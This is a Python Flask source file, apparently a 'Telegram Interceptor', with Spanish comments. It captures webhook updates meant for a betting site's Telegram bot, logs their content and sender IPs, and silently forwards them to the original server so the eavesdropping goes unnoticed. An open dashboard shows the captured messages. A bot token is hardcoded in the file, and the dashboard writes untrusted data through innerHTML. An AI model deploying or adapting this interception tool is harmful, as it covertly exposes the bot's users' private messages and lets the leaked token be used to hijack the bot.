from flask import Flask, request, jsonify, render_template_string
import requests
import json
from datetime import datetime
import os

app = Flask(__name__)

# ===== CONFIGURACIÓN =====
TOKEN = os.environ.get("BOT_TOKEN", "7714338053:AAFdVVoXPdwjtngHDbjJ4a7yhbLJ1nJj3ac")
ORIGINAL_WEBHOOK = os.environ.get(
    "ORIGINAL_WEBHOOK",
    f"https://bet-users.up.railway.app/telegram/{TOKEN}"
)

# Almacenamiento en memoria
captured_messages = []

# ===== INTERCEPTOR =====
@app.route(f"/intercept/<path:token>", methods=["POST"])
def intercept(token):
    data = request.json or {}

    entry = {
        "id": len(captured_messages) + 1,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip_origen": request.remote_addr,
        "data": data
    }
    captured_messages.append(entry)
    print(f"\n🎯 [{entry['timestamp']}] Mensaje #{entry['id']} capturado")
    print(json.dumps(data, indent=2, ensure_ascii=False))

    # Reenviar al servidor original (silencioso)
    try:
        requests.post(ORIGINAL_WEBHOOK, json=data, timeout=5)
        print("✅ Reenviado al servidor original")
    except Exception as e:
        print(f"⚠️ Error reenviando: {e}")

    return jsonify({"ok": True})


# ===== DASHBOARD =====
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🕵️ Interceptor - Seguridad Informática</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0d1117; color: #e6edf3; font-family: 'Courier New', monospace; }
        header { background: #161b22; border-bottom: 1px solid #30363d; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; }
        header h1 { color: #58a6ff; font-size: 1.2rem; }
        .badge { background: #238636; color: #fff; padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; }
        .stats { display: flex; gap: 16px; padding: 20px 24px; }
        .stat { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px 24px; flex: 1; text-align: center; }
        .stat .num { font-size: 2rem; color: #58a6ff; font-weight: bold; }
        .stat .label { font-size: 0.75rem; color: #8b949e; margin-top: 4px; }
        .messages { padding: 0 24px 24px; }
        .messages h2 { color: #8b949e; font-size: 0.85rem; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
        .message { background: #161b22; border: 1px solid #30363d; border-radius: 8px; margin-bottom: 12px; overflow: hidden; }
        .message-header { display: flex; justify-content: space-between; padding: 10px 16px; background: #1c2128; border-bottom: 1px solid #30363d; }
        .message-header .mid { color: #f85149; font-weight: bold; }
        .message-header .time { color: #8b949e; font-size: 0.8rem; }
        .message-body { padding: 12px 16px; font-size: 0.8rem; overflow-x: auto; }
        pre { color: #a5d6ff; white-space: pre-wrap; word-break: break-word; }
        .highlight { color: #ffa657; }
        .empty { text-align: center; color: #8b949e; padding: 60px; }
        .auto-badge { background: #1f6feb; color: #fff; padding: 2px 8px; border-radius: 4px; font-size: 0.7rem; margin-left: 8px; }
    </style>
    <script>
        // Auto-refresh cada 5 segundos
        setInterval(() => {
            fetch('/api/messages')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('count').textContent = data.length;
                    document.getElementById('last').textContent = data.length > 0 ? data[data.length-1].timestamp : '---';
                    renderMessages(data);
                });
        }, 5000);

        function renderMessages(messages) {
            const container = document.getElementById('msg-container');
            if (messages.length === 0) {
                container.innerHTML = '<div class="empty">⏳ Esperando mensajes...</div>';
                return;
            }
            container.innerHTML = [...messages].reverse().map(m => `
                <div class="message">
                    <div class="message-header">
                        <span class="mid">🎯 Mensaje #${m.id}</span>
                        <span class="time">${m.timestamp} | IP: ${m.ip_origen}</span>
                    </div>
                    <div class="message-body">
                        <pre>${JSON.stringify(m.data, null, 2)}</pre>
                    </div>
                </div>
            `).join('');
        }

        window.onload = () => {
            fetch('/api/messages').then(r => r.json()).then(renderMessages);
        };
    </script>
</head>
<body>
    <header>
        <h1>🕵️ Telegram Interceptor <span class="auto-badge">AUTO-REFRESH 5s</span></h1>
        <span class="badge">🟢 ACTIVO</span>
    </header>
    <div class="stats">
        <div class="stat">
            <div class="num" id="count">0</div>
            <div class="label">Mensajes Capturados</div>
        </div>
        <div class="stat">
            <div class="num" style="font-size:1rem; padding-top:8px;" id="last">---</div>
            <div class="label">Último Mensaje</div>
        </div>
    </div>
    <div class="messages">
        <h2>📨 Mensajes en tiempo real</h2>
        <div id="msg-container">
            <div class="empty">⏳ Esperando mensajes...</div>
        </div>
    </div>
</body>
</html>
"""

@app.route("/")
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route("/api/messages")
def api_messages():
    return jsonify(captured_messages)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 Interceptor corriendo en puerto {port}")
    print(f"🔗 Webhook destino: {ORIGINAL_WEBHOOK}")
    app.run(host="0.0.0.0", port=port, debug=False)
